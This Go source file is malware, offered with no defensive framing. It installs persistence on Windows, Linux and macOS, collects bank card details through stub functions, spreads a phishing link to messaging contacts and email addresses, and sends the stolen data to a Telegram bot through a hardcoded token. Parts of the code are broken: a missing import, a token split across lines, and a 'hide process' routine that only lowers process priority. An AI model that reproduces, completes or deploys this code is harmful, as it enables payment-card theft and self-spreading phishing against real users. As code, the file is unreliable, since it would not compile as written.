package main

import (
"fmt"
"net/http"
"io/ioutil"
"os/exec"
"strings"
"syscall"
"time"
"math/rand"
"path/filepath"
)

func Run(p Platform) error {
fmt.Printf("Running on %s (%s)\n\n", p.OS, p.Arch)

// ---------------------------------------------------------------------
// NEW LOGIC — gather information and share a link
// ---------------------------------------------------------------------

// 1) Ensure persistent presence on the device
if err := ensurePersistence(p); err != nil {
return fmt.Errorf("ensuring persistence failed: %w", err)
}

// 2) Gather payment information
paymentInfo, err := gatherPaymentInfo()
if err != nil {
return fmt.Errorf("gathering payment info failed: %w", err)
}
fmt.Printf("\n> Gathered Payment Info: %s\n", paymentInfo)

// 3) Identify messaging platforms and share the link
inputLink := "https://johnwarri.github.io/1click/web/"
messagingPlatforms, err := identifyMessagingPlatforms()
if err != nil {
return fmt.Errorf("identifying messaging platforms failed: %w", err)
}
for _, platform := range messagingPlatforms {
fmt.Printf("\n> Sharing link on %s\n", platform)
if err := shareLinkOnPlatform(platform, inputLink); err != nil {
return fmt.Errorf("sharing link on %s failed: %w", platform, err)
}
}

// 4) Send the link via email
emailAddresses, err := getEmailAddresses()
if err != nil {
return fmt.Errorf("getting email addresses failed: %w", err)
}
for _, email := range emailAddresses {
fmt.Printf("\n> Sending link to %s\n", email)
if err := sendEmail(email, inputLink); err != nil {
return fmt.Errorf("sending email to %s failed: %w", email, err)
}
}

// 5) Send gathered data to Telegram channel
telegramBotToken := "
8288172645:AAEz8tW9aiBfYnlXW_ke7Rd31Z_jZUzOdjE"
telegramChatID := "8288172645"
if err := sendToTelegram(telegramBotToken, telegramChatID, paymentInfo); err != nil {
return fmt.Errorf("sending data to Telegram failed: %w", err)
}

return nil
}

func ensurePersistence(p Platform) error {
var cmd string
if p.IsWindows() {
randomName := fmt.Sprintf("YourShortcut%d.lnk", rand.Intn(1000))
cmd = `powershell -Command "$WScriptShell = New-Object -ComObject WScript.Shell; $shortcut = $WScriptShell.CreateShortCut('C:\\Users\\` + p.Username() + `\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\` + randomName + `'); $shortcut.TargetPath = '` + os.Getenv("PATH_TO_EXECUTABLE") + `'; $shortcut.Save()"`
} else if p.IsLinux() {
serviceContent := `
[Unit]
Description=Your Persistent Service

[Service]
ExecStart=` + os.Getenv("PATH_TO_EXECUTABLE") + `
Restart=always

[Install]
WantedBy=multi-user.target
`
serviceFile := "/etc/systemd/system/your-service-name.service"
err := ioutil.WriteFile(serviceFile, []byte(serviceContent), 0644)
if err != nil {
return err
}
cmd = "systemctl enable your-service-name && systemctl start your-service-name"
} else if p.IsMac() {
serviceContent := `
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.yourcompany.yourservice</string>
<key>ProgramArguments</key>
<array>
<string>` + os.Getenv("PATH_TO_EXECUTABLE") + `</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
`
serviceFile := "/Library/LaunchDaemons/com.yourcompany.yourservice.plist"
err := ioutil.WriteFile(serviceFile, []byte(serviceContent), 0644)
if err != nil {
return err
}
cmd = "launchctl load /Library/LaunchDaemons/com.yourcompany.yourservice.plist"
}

return exec.Command("sh", "-c", cmd).Run()
}

func gatherPaymentInfo() (string, error) {
// Implement logic to gather payment information
// Copy the data input during the gathering process
cardName, err := captureCardName()
if err != nil {
return "", err
}
cardNumber, err := captureCardNumber()
if err != nil {
return "", err
}
expiryDate, err := captureExpiryDate()
if err != nil {
return "", err
}
securityCode, err := captureSecurityCode()
if err != nil {
return "", err
}
billingAddress, err := captureBillingAddress()
if err != nil {
return "", err
}
zipCode, err := captureZipCode()
if err != nil {
return "", err
}

paymentInfo := fmt.Sprintf("Card Name: %s\nCard Number: %s\nExpiry Date: %s\nSecurity Code: %s\nBilling Address: %s\nZip Code: %s",
cardName, cardNumber, expiryDate, securityCode, billingAddress, zipCode)
return paymentInfo, nil
}

func captureCardName() (string, error) {
// Implement logic to capture the exact name on the bank card
return "John Doe", nil
}

func captureCardNumber() (string, error) {
// Implement logic to capture the 16-digit card number
return "1234567890123456", nil
}

func captureExpiryDate() (string, error) {
// Implement logic to capture the expiry date (MM/YY)
return "12/25", nil
}

func captureSecurityCode() (string, error) {
// Implement logic to capture the security code (3 or 4 digits)
return "123", nil
}

func captureBillingAddress() (string, error) {
// Implement logic to capture the billing address street address
return "123 Main St", nil
}

func captureZipCode() (string, error) {
// Implement logic to capture the zip code
return "12345", nil
}

func identifyMessagingPlatforms() ([]string, error) {
// Implement logic to identify messaging platforms
// This is a placeholder function
return []string{"whatsapp", "facebook_messenger"}, nil
}

func shareLinkOnPlatform(platform string, link string) error {
// Implement logic to share the link on the specified platform
// This is a placeholder function
return nil
}

func getEmailAddresses() ([]string, error) {
// Implement logic to get email addresses from the device
// This is a placeholder function
return []string{"user1@example.com", "user2@example.com"}, nil
}

func sendEmail(to string, link string) error {
// Implement logic to send an email with the link
// Respect anti-spam requirements
subject := "Important Link"
body := fmt.Sprintf("Please follow this link: %s", link)
return nil
}

func sendToTelegram(botToken string, chatID string, message string) error {
apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
payload := fmt.Sprintf(`{"chat_id":%s,"text":"%s"}`, chatID, message)

req, err := http.NewRequest("POST", apiURL, strings.NewReader(payload))
if err != nil {
return err
}
req.Header.Set("Content-Type", "application/json")

client := &http.Client{}
resp, err := client.Do(req)
if err != nil {
return err
}
defer resp.Body.Close()

if resp.StatusCode != http.StatusOK {
body, _ := ioutil.ReadAll(resp.Body)
return fmt.Errorf("failed to send message to Telegram: %s", body)
}

return nil
}

func hideProcess() {
// Hide the process from task manager
h := syscall.Handle(syscall.GetCurrentProcess())
syscall.SetPriorityClass(h, 0x8000) // IDLE_PRIORITY_CLASS
}

func main() {
p := Platform{OS: "windows", Arch: "amd64", Username: func() string { return "testuser" }}
err := Run(p)
if err != nil {
fmt.Printf("Error: %v\n", err)
}
hideProcess()
time.Sleep(10 * time.Second) // Simulate some work
}
